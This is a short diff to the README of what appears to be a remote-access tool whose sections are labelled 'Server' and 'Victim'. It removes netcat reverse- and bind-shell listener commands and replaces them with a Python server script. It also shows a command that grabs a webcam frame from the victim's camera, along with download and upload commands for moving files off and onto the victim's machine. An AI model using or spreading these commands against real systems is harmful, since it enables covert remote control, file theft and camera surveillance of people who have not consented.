@@ -10,11 +10,7 @@ python2.7 and python3
 
 ## Server
 ```
-#reverse shell
-nc -lvp 6666
-
-#bind shell
-nc <IP> 6666
+/bin/python3 srv.py
 ```
 
 ## Victim
@@ -39,15 +35,10 @@ ffmpeg -f video4linux2 -s 640x480 -i /dev/video0 -ss 0:0:1 -frames 1 /tmp/selfie
 ```
 
 ## download File
-Attacker:
-```
-#reverse shell
-nc -lvp 6667 > sus_text.txt
-
-#bind shell
-nc <IP> 6667 > sus_text.txt
-```
-Victim:
 ```
 [Honigkuchenpferd /home/Doofy/Dokumente/sus_stuff] download sus_text.txt
+```
+## upload File
+```
+[Honigkuchenpferd /home/Doofy/Dokumente/sus_stuff] upload sus_prog.bin
 ```
